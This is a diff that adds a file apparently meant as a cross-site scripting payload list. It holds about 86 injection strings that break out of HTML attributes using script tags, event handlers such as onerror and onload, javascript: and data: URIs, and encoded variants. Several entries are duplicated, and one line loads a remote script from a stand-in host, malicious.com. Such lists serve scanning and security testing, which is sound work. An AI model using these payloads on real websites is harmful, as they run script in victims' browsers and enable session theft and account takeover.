@@ -1,0 +1,86 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+"><body onload=alert(1)>
+"><iframe src=javascript:alert(1)>
+"><input type="text" value="<script>alert(1)</script>">
+"><div onmouseover=alert(1)>hover me</div>
+"><img src=x onerror="alert(1)">
+"><img src="javascript:alert(1)">
+"><svg onload="alert(1)">
+"><body onload="alert(1)">
+"><iframe src="javascript:alert(1)">
+"><input type="text" value="<script>alert(1)</script>">
+"><div onmouseover="alert(1)">hover me</div>
+"><video><source onerror="alert(1)">
+"><a href="javascript:alert(1)">click me</a>
+"><input onfocus="alert(1)">
+"><object data="javascript:alert(1)">
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+"><svg><animatetransform onbegin=alert(1)>
+"><audio src onerror=alert(1)>
+"><marquee onstart=alert(1)>
+"><keygen autofocus onfocus=alert(1)>
+"><meter onmouseover=alert(1)>
+"><progress onmouseover=alert(1)>
+"><time datetime onmouseover=alert(1)>
+"><details ontoggle=alert(1)>
+<svg><script xlink:href=data:text/javascript,alert(1)></script></svg>
+"><iframe srcdoc="<script>alert(1)</script>">
+"><button formaction="javascript:alert(1)">Click</button>
+"><link rel="import" href="data:text/html,<script>alert(1)</script>">
+"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+"><img src onerror="&#x6a;avascript:alert(1)">
+"><iframe src="data:text/html,<script>alert(1)"></iframe>
+"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+"><svg onload="javascript:alert(1)">
+"><img src='javascript:alert(1)'>
+"><body onload="alert(1)">
+"><img src=x onerror=alert(1)>"<svg onload=alert(1)>
+"><script src=//malicious.com/alert.js>
+"><object data="javascript:alert(1)">
+"><video onloadstart=alert(1)>
+"><svg><foreignObject><![CDATA[<script>alert(1)</script>]]></foreignObject></svg>
+"><math><maction xlink:href="javascript:alert(1)">
+"><input onblur="alert(1)">
+"><command type="command" onclick="alert(1)">
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+"><script src=javascript:alert(1)>
+"><object type="text/x-scriptlet" data="javascript:alert(1)">
+"><applet code="javascript:alert(1)">
+"><meta charset="x-user-defined" content="<script>alert(1)">
+"><embed src="javascript:alert(1)">
+"><isindex action="javascript:alert(1)">
+"><nextid n=alert(1)>
+"><style>@import "javascript:alert(1)";
+"><layer src="javascript:alert(1)">
+"><spacer type="block" width="100%" height="100%" onresize="alert(1)">
+"><form action="javascript:alert(1)">
+"><bgsound src="javascript:alert(1)">
+"><ilayer onfocus="alert(1)">
+"><plaintext><script>alert(1)</script>
+"><xss><script>alert(1)</script>
+"><link rel="dns-prefetch" href="javascript:alert(1)">
+"><meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline' 'unsafe-eval';">
+"><script src="data:text/javascript,alert(1)">
+"><meta charset="utf-7"><script>alert(1)</script>
+"><script charset="x-user-defined">alert(1)</script>
+"><marquee loop=1 width=0 onfinish=alert(1)>
+"><link rel="import" href="data:text/html,<script>alert(1)"></script>
+"><iframe src="javascript:alert(1)">
+"><iframe src="data:text/html,<script>alert(1)"></iframe>
+"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+"><link rel="stylesheet" href="javascript:alert(1)">
+"><svg onload="javascript:alert(1)">
+"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+"><form action="javascript:alert(1)">
+"><input type="image" src="javascript:alert(1)">
+"><img src='javascript:alert(1)'>
+"><form action=javascript:alert(1)>
+"><button formaction=javascript:alert(1)>Click</button>
+"><link rel="import" href="data:text/html,<script>alert(1)"></script>
+"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+"><input type="text" value="<script>alert(1)</script>">
+"><div onmouseover="alert(1)">hover me</div>
